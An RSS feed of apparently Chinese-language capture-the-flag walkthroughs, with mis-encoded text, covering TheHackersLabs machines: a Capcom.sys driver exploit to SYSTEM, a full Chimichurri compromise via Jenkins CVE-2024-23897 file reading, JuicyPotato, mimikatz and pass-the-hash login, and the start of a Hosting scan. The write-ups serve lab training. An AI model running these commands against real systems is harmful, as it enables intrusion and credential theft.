Data: 387752 bytes of 387752 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/eoploaddriver_x64.exe

Info: Uploading /home/kali/thl/Pacharan/eoploaddriver_x64.exe to C:\Users\Chivas Regal\Documents\eoploaddriver_x64.exe

Data: 92840 bytes of 92840 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; upload /home/kali/thl/Pacharan/Capcom.sys

Info: Uploading /home/kali/thl/Pacharan/Capcom.sys to C:\Users\Chivas Regal\Documents\Capcom.sys

Data: 14100 bytes of 14100 bytes copied

Info: Upload successful!


åŠ è½½æ¶æ„é©±åŠ¨ç¨‹åºï¼š
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; .\ExploitCapcom.exe LOAD c:\windows\tasks\Capcom.sys
[*] Service Name: drlynhqu
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-3046175042-3013395696-775018414-1108\?????????????????
NTSTATUS: 00000000, WinError: 0


æ¼æ´åˆ©ç”¨ ç‰¹æƒç”¨æˆ·æ‰§è¡Œå‘½ä»¤
*Evil-WinRM* PS C:\Users\Chivas Regal\Documents&gt; .\ExploitCapcom.exe EXPLOIT whoami
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000064
[*] Shellcode was placed at 00000239224D0008
[+] Shellcode was executed
[+] Token stealing was successful
[+] Command Executed
nt authority\system

]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/2.pacharan.html</link><guid isPermaLink="false">24-æ¸—é€/THL/2.Pacharan.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[10.Cyberguard]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/10.cyberguard.html</link><guid isPermaLink="false">24-æ¸—é€/THL/10.Cyberguard.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate></item><item><title><![CDATA[1.Chimichurri]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. SMBç©ºä¼šè¯æ£€æµ‹" data-href="#3. SMBç©ºä¼šè¯æ£€æµ‹" href="https://www.c1trus.top/about:blank#3._SMBç©ºä¼šè¯æ£€æµ‹" class="internal-link" target="_self" rel="noopener nofollow">3. SMBç©ºä¼šè¯æ£€æµ‹</a>
<br><a data-tooltip-position="top" aria-label="4. rid-bruteè·å–åŸŸå†…ç”¨æˆ·" data-href="#4. rid-bruteè·å–åŸŸå†…ç”¨æˆ·" href="https://www.c1trus.top/about:blank#4._rid-bruteè·å–åŸŸå†…ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">4. rid-bruteè·å–åŸŸå†…ç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="5. ldapè·å–åŸŸå†…åŸºç¡€ä¿¡æ¯" data-href="#5. ldapè·å–åŸŸå†…åŸºç¡€ä¿¡æ¯" href="https://www.c1trus.top/about:blank#5._ldapè·å–åŸŸå†…åŸºç¡€ä¿¡æ¯" class="internal-link" target="_self" rel="noopener nofollow">5. ldapè·å–åŸŸå†…åŸºç¡€ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="6. kerbruteæšä¸¾å‡ºåŸŸå†…ç”¨æˆ·" data-href="#6. kerbruteæšä¸¾å‡ºåŸŸå†…ç”¨æˆ·" href="https://www.c1trus.top/about:blank#6._kerbruteæšä¸¾å‡ºåŸŸå†…ç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">6. kerbruteæšä¸¾å‡ºåŸŸå†…ç”¨æˆ·</a>
<br><a data-tooltip-position="top" aria-label="7. å¯†ç å–·æ¶‚" data-href="#7. å¯†ç å–·æ¶‚" href="https://www.c1trus.top/about:blank#7._å¯†ç å–·æ¶‚" class="internal-link" target="_self" rel="noopener nofollow">7. å¯†ç å–·æ¶‚</a>
<br><a data-tooltip-position="top" aria-label="8. Jenkinsåˆ©ç”¨" data-href="#8. Jenkinsåˆ©ç”¨" href="https://www.c1trus.top/about:blank#8._Jenkinsåˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">8. Jenkinsåˆ©ç”¨</a>
<br><a data-tooltip-position="top" aria-label="9. ææƒ" data-href="#9. ææƒ" href="https://www.c1trus.top/about:blank#9._ææƒ" class="internal-link" target="_self" rel="noopener nofollow">9. ææƒ</a>
<br><a data-tooltip-position="top" aria-label="10. é™æƒ" data-href="#10. é™æƒ" href="https://www.c1trus.top/about:blank#10._é™æƒ" class="internal-link" target="_self" rel="noopener nofollow">10. é™æƒ</a><br>
é¶æœºé“¾æ¥ thehackerslabs.com/chimichurri/<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# fscan -h 192.168.200.4

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.200.4:88 open
192.168.200.4:139 open
192.168.200.4:135 open
192.168.200.4:445 open
[*] alive ports len is: 4
start vulscan
[*] NetInfo
[*]192.168.200.4
   [-&gt;]CHIMICHURRI
   [-&gt;]192.168.200.4
[*] NetBios 192.168.200.4   [+] DC:CHIMICHURRI0\CHIMICHURRI
å·²å®Œæˆ 4/4
[*] æ‰«æç»“æŸ,è€—æ—¶: 1.070314445s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# nmap -sC -sV 192.168.200.4
Nmap scan report for CHIMICHURRI0.local (192.168.200.4)
Host is up (0.00043s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-03 10:37:33Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: chimichurri.thl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
6969/tcp open  http          Jetty 10.0.11
|_http-title: Panel de control [Jenkins]
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.11)
MAC Address: 08:00:27:B8:51:4D (Oracle VirtualBox virtual NIC)
Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-12-03T10:37:33
|_  start_date: 2024-12-03T10:04:56
|_nbstat: NetBIOS name: CHIMICHURRI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:b8:51:4d (Oracle VirtualBox virtual NIC)
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 5h59m57s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds

<br>åŸŸå CHIMICHURRI0<br>
é…ç½®ä¸€ä¸‹ etc/hosts<br>192.168.200.4 chimichurri.thl
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# smbmap -u anonymous -H 192.168.200.4

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)

[+] IP: 192.168.200.4:445       Name: chimichurri.thl        Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Admin remota
        C$                                                      NO ACCESS       Recurso predeterminado
        drogas                                                  READ ONLY
        IPC$                                                    READ ONLY       IPC remota
        NETLOGON                                                NO ACCESS       Recurso compartido del servidor de inicio de sesiÃ³n
        SYSVOL                                                  NO ACCESS       Recurso compartido del servidor de inicio de sesiÃ³n

<br>æŸ¥çœ‹smbå…±äº«ç›®å½•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# smbclient -U '' //chimichurri.thl/drogas
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Thu Jun 27 18:20:49 2024
  ..                                  D        0  Thu Jun 27 18:20:49 2024
  credenciales.txt                    A       95  Mon Jul  1 01:19:03 2024

                7735807 blocks of size 4096. 4368462 blocks available

smb: \&gt; get credenciales.txt
getting file \credenciales.txt of size 95 as credenciales.txt (46.4 KiloBytes/sec) (average 46.4 KiloBytes/sec)
smb: \&gt; exit

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# smbclient -U '' //chimichurri.thl/IPC$
Password for [WORKGROUP\]:
Try "help" to get a list of possible commands.
smb: \&gt; ls -a
NT_STATUS_NO_SUCH_FILE listing \-a
smb: \&gt; exit

<br>æŸ¥çœ‹æ–‡ä»¶å†…å®¹<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# cat credenciales.txt
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico     
<br>
è¿™å¥è¥¿ç­ç‰™è¯­çš„æ„æ€æ˜¯ï¼š<br>
â€œæ‰€æœ‰äº‹æƒ…éƒ½ä¼šæ›´å¥½ï¼Œå› ä¸ºæœ‰é»‘å®¢ç”¨æˆ·ï¼Œä»–çš„æ¡Œå­ä¸Šæœ‰ä»–çš„è®¿é—®å¯†é’¥ï¼Œå°±åƒé¹¦é¹‰ä¸€æ ·ã€‚â€<br>
å…¶ä¸­â€œcomo pericoâ€æ˜¯ä¸ªæ¯”å–»ï¼Œå¯èƒ½æ„å‘³ç€â€œå¾ˆæ˜¾çœ¼â€æˆ–â€œéšæ„æ”¾ç½®â€ï¼Œæš—ç¤ºè¿™äº›å¯†é’¥æ²¡æœ‰è¢«å¦¥å–„ä¿æŠ¤ã€‚
<br><br>å› ä¸ºå­˜åœ¨ smbç©ºä¼šè¯ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿›è¡Œ rid-brute è·å–åŸŸå†…ç”¨æˆ·<br>
rid-brute åªéœ€è¦æœ‰ä¸€ä¸ªåŸŸå†…åˆæ³•ç”¨æˆ·å³å¯è¿›è¡Œã€‚
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# crackmapexec smb chimichurri.thl -u 'guest ' -p ' ' --rid-brute

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# crackmapexec smb chimichurri.thl -u 'guest ' -p ' ' --rid-brute
SMB         chimichurri.thl 445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
SMB         chimichurri.thl 445    CHIMICHURRI      [+] chimichurri.thl\guest :
SMB         chimichurri.thl 445    CHIMICHURRI      [-] Error creating DCERPC connection: SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

<br>å¤±è´¥äº†ã€‚ è¿™é‡Œå¯¹åŒ¿åç”¨æˆ·çš„æƒé™åšäº†è®¾ç½®<br><br>ldapsearch -x -H ldap://192.168.200.4 -s 'base' namingcontexts

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# ldapsearch -x -H ldap://192.168.200.4 -s 'base' namingcontexts
# extended LDIF
#
# LDAPv3
# base &lt;&gt; (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingContexts: DC=chimichurri,DC=thl
namingContexts: CN=Configuration,DC=chimichurri,DC=thl
namingContexts: CN=Schema,CN=Configuration,DC=chimichurri,DC=thl
namingContexts: DC=DomainDnsZones,DC=chimichurri,DC=thl
namingContexts: DC=ForestDnsZones,DC=chimichurri,DC=thl

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
<br>æ²¡å•¥æœ‰ç”¨çš„ä¸œè¥¿<br><br>æˆ‘ä»¬ç›®å‰éœ€è¦ä¸€ä¸ªå¯ç”¨çš„åŸŸç”¨æˆ·ã€‚ç”±äºå¯¹åŒ¿åç”¨æˆ·åšäº†é™åˆ¶ä¸è®©è¿›è¡Œ rid-brute ç›´æ¥è·å–åŸŸå†…ç”¨æˆ·ã€‚ é‚£åªèƒ½å°è¯•çˆ†ç ´æšä¸¾äº†<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# kerbrute userenum -d chimichurri.thl -t 100 --dc 192.168.200.4  /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 12/03/24 - Ronnie Flathers @ropnop

2024/12/03 12:49:28 &gt;  Using KDC(s):
2024/12/03 12:49:28 &gt;   192.168.200.4:88

2024/12/03 12:49:28 &gt;  [+] VALID USERNAME:       hacker@chimichurri.thl
2024/12/03 12:49:28 &gt;  [+] VALID USERNAME:       Hacker@chimichurri.thl
2024/12/03 12:49:33 &gt;  [+] VALID USERNAME:       invitado@chimichurri.thl
2024/12/03 12:49:47 &gt;  [+] VALID USERNAME:       administrador@chimichurri.thl
2024/12/03 12:49:48 &gt;  [+] VALID USERNAME:       HACKER@chimichurri.thl

2024/12/03 12:54:16 &gt;  Done! Tested 8295455 usernames (5 valid) in 288.265 seconds

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# awk '{print $7}' valid_user.txt | sed 's/@.*//' &gt;kerber_brute_users.txt

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# cat kerber_brute_users.txt
hacker
Hacker
invitado
administrador
HACKER

<br>å°è¯•åˆ©ç”¨è¿™äº›ç”¨æˆ·çš„åå­—ä½œä¸ºå¯†ç è¿›è¡Œçˆ†ç ´<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# crackmapexec smb chimichurri.thl -u kerber_brute_users.txt -p kerber_brute_users.txt --no-bruteforce --continue-on-success
SMB         chimichurri.thl 445    CHIMICHURRI      [*] Windows 10 / Server 2016 Build 14393 x64 (name:CHIMICHURRI) (domain:chimichurri.thl) (signing:True) (SMBv1:False)
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\hacker:hacker STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\Hacker:Hacker STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\invitado:invitado STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\administrador:administrador STATUS_LOGON_FAILURE
SMB         chimichurri.thl 445    CHIMICHURRI      [-] chimichurri.thl\HACKER:HACKER STATUS_LOGON_FAILURE
<br>çœ‹æ¥ä¸å­˜åœ¨å°†ç”¨æˆ·åä½œä¸ºå¯†ç çš„ç”¨æˆ·<br><br>è§‚å¯Ÿnmapçš„ç»“æœå¯ä»¥å‘ç°é¶æœºæ˜¯å¼€æ”¾äº†Jenkinsçš„<br>6969/tcp open  http          Jetty 10.0.11
|_http-title: Panel de control [Jenkins]
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(10.0.11)
MAC Address: 08:00:27:B8:51:4D (Oracle VirtualBox virtual NIC)
Service Info: Host: CHIMICHURRI; OS: Windows; CPE: cpe:/o:microsoft:windows
<br><img alt="Pasted image 20241203133056" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" referrerpolicy="no-referrer"><br>
jenkinsæ˜¯æœ‰å¾ˆå¤šæ¼æ´çš„<br>
å…ˆå»æ‰¾ä¸€ä¸ªæœ€æ–°çš„è¯•è¯•<br>
<a rel="noopener nofollow" class="external-link" href="https://www.exploit-db.com/" target="_blank">https://www.exploit-db.com/</a><br>
<img alt="Pasted image 20241203134231" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203134231.png" referrerpolicy="no-referrer"><br>è¯•è¯•è¿™ä¸ªLFI ï¼ˆ<a data-tooltip-position="top" aria-label="../../20-ç½‘å®‰/28-CVEå¤ç°/CVE-2024-23897" data-href="../../20-ç½‘å®‰/28-CVEå¤ç°/CVE-2024-23897" href="https://www.c1trus.top/20-ç½‘å®‰/28-cveå¤ç°/cve-2024-23897.html" class="internal-link" target="_self" rel="noopener nofollow">CVE-2024-23897</a>ï¼‰<br>ä¹‹å‰çš„ credenciales.txt æç¤ºæˆ‘ä»¬åœ¨ hacker ç”¨æˆ·çš„æ¡Œé¢æœ‰ä¸€ä¸ªå‡­è¯<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# cat credenciales.txt
Todo es mejor en con el usuario hacker, en su escritorio estan sus claves de acceso como perico     
<br>
è¿™å¥è¥¿ç­ç‰™è¯­çš„æ„æ€æ˜¯ï¼š<br>
â€œæ‰€æœ‰äº‹æƒ…éƒ½ä¼šæ›´å¥½ï¼Œå› ä¸ºæœ‰é»‘å®¢ç”¨æˆ·ï¼Œä»–çš„æ¡Œå­ä¸Šæœ‰ä»–çš„è®¿é—®å¯†é’¥ï¼Œå°±åƒé¹¦é¹‰ä¸€æ ·ã€‚â€<br>
å…¶ä¸­â€œcomo pericoâ€æ˜¯ä¸ªæ¯”å–»ï¼Œå¯èƒ½æ„å‘³ç€â€œå¾ˆæ˜¾çœ¼â€æˆ–â€œéšæ„æ”¾ç½®â€ï¼Œæš—ç¤ºè¿™äº›å¯†é’¥æ²¡æœ‰è¢«å¦¥å–„ä¿æŠ¤ã€‚
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# python3 51993.py -u http://192.168.200.4:6969
Press Ctrl+C to exit
File to download:
&gt; /users/hacker/desktop/perico.txt
hacker:Perico69

<br>æˆåŠŸè·å– hacker ç”¨æˆ·çš„å¯†ç <br>å°è¯•çœ‹èƒ½ä¸èƒ½ç™»å½•<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# evil-winrm -i 192.168.200.4 -u hacker -p Perico69

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents&gt;

<br>æˆåŠŸç™»å½•<br><br>å…ˆçœ‹ä¸€ä¸‹å½“å‰ç”¨æˆ·çš„æƒé™<br>INFORMACIÃ N DE PRIVILEGIOS
--------------------------

Nombre de privilegio          DescripciÂ¢n                                  Estado
============================= ============================================ ==========
SeMachineAccountPrivilege     Agregar estaciones de trabajo al dominio     Habilitada
SeChangeNotifyPrivilege       Omitir comprobaciÂ¢n de recorrido             Habilitada
SeImpersonatePrivilege        Suplantar a un cliente tras la autenticaciÂ¢n Habilitada
SeIncreaseWorkingSetPrivilege Aumentar el espacio de trabajo de un proceso Habilitada

<br>SeImpersonatePrivilege æƒé™å…è®¸æˆ‘ä»¬åˆ©ç”¨åˆ«äººçš„ç”¨æˆ·æƒé™è¿›è¡Œå‘½ä»¤æ‰§è¡Œ<br>
å¯ä»¥ä¼ ä¸€ä¸ª <a data-tooltip-position="top" aria-label="../../26-å·¥å…·ä½¿ç”¨/RunasCSä½¿ç”¨" data-href="../../26-å·¥å…·ä½¿ç”¨/RunasCSä½¿ç”¨" href="https://www.c1trus.top/26-å·¥å…·ä½¿ç”¨/runascsä½¿ç”¨.html" class="internal-link" target="_self" rel="noopener nofollow">RunasCS</a> è¿›è¡Œåˆ©ç”¨ã€‚ä¹Ÿå¯ä»¥ç”¨ä¼ åœŸè±†è¿›è¡Œææƒ<br>
ä½† RunasCS éœ€è¦å¦ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç  æ‰€ä»¥è¿™é‡Œæ’é™¤ä½¿ç”¨è¿™ä¸ª<br>è¿™é‡Œæˆ‘éƒ½ä¸é€‰ã€‚æˆ‘ç”¨csææƒ<br>
ä¼ ä¸€ä¸ªcsåé—¨è¿è¡Œï¼Œä¸Šçº¿<br>
<img alt="Pasted image 20241203135830" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203135830.png" referrerpolicy="no-referrer"><br>é€‰æ‹©Juicypotatoææƒ<br>
<img alt="Pasted image 20241203140042" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203140042.png" referrerpolicy="no-referrer"><br>
æˆåŠŸæå–åˆ°ç³»ç»Ÿ<br>è¿™é‡Œè¿˜æœ‰ä¸ªé—®é¢˜ã€‚è·å–åˆ°äº†ç³»ç»Ÿæƒé™è¿˜ä¸è®©æˆ‘çœ‹flagï¼Œåªç»™ç®¡ç†å‘˜æƒé™çš„ç”¨æˆ·çœ‹çœ‹<br><br>è¿™é‡Œéœ€è¦é™æƒã€‚ç³»ç»Ÿæƒé™é™æƒåˆ°ç®¡ç†å‘˜å¾ˆç®€å•ã€<br>
åœ¨csé‡Œé¢ å¯ä»¥ä½¿ç”¨è¿›ç¨‹æ³¨å…¥ æˆ–è€…ä»¤ç‰Œçªƒå–<br>è¿™é‡Œæˆ‘é‡‡ç”¨ç›´æ¥mimikatzæŠ“ç®¡ç†å‘˜hashç”¨ç®¡ç†å‘˜ç™»å½•<br>
<img alt="Pasted image 20241203142754" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203142754.png" referrerpolicy="no-referrer"><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/Chimichurri]
â””â”€# evil-winrm -i 192.168.200.4 -u Administrador -H 058a4c99bab8b3d04a6bd959f95ce2b2

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; whoami
chimichurri0\administrador

*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; type c:\users\administrador\desktop\root.txt
hjafcdv8a75e3cvsdfg6asd4f9vbsf9sa
*Evil-WinRM* PS C:\Users\Administrador\Documents&gt; type c:\users\hacker\desktop\user.txt
acrsgvs6edr8f5vaw9a8eadv6fa9b

<br>
æ³¨æ„è¿™æ¯”è¥¿ç­ç‰™è¯­çš„ç®¡ç†å‘˜åå­—ä¸è‹±è¯­çš„ç®¡ç†å‘˜æœ‰åŒºåˆ«
]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/1.chimichurri.html</link><guid isPermaLink="false">24-æ¸—é€/THL/1.Chimichurri.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241203133056.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[4.Hosting]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a><br>
- <a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a><br>
- <a data-tooltip-position="top" aria-label="2.2. ç›®å½•æ‰«æ" data-href="#2.2. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#2.2._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.2. ç›®å½•æ‰«æ</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Hosting]
â””â”€# nmap 192.168.56.21 -sCV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 03:54 EST
Nmap scan report for 192.168.56.21
Host is up (0.00069s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
80/tcp  open  tcpwrapped
|_http-title: IIS Windows
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped

Host script results:
| smb2-time:
|   date: 2024-12-23T14:54:55
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
|_clock-skew: 5h59m58s
|_nbstat: NetBIOS name: HOSTING, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:46:6d:91 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.36 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Hosting]
â””â”€# gobuster dir -u http://192.168.56.21/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.21/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,zip,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/speed                (Status: 301) [Size: 161] [--&gt; http://192.168.56.21/speed/]

<br><img alt="assets/Pasted image 20241223165928.png" src="https://www.c1trus.top/24-æ¸—é€/vulnyx/assets/pasted-image-20241223165928.png"><br>
ç»§ç»­å¯¹è¿™ä¸ªç›®å½•æ‰«æ<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/vulnyx/Hosting]
â””â”€# dirsearch -u http://192.168.56.21/speed
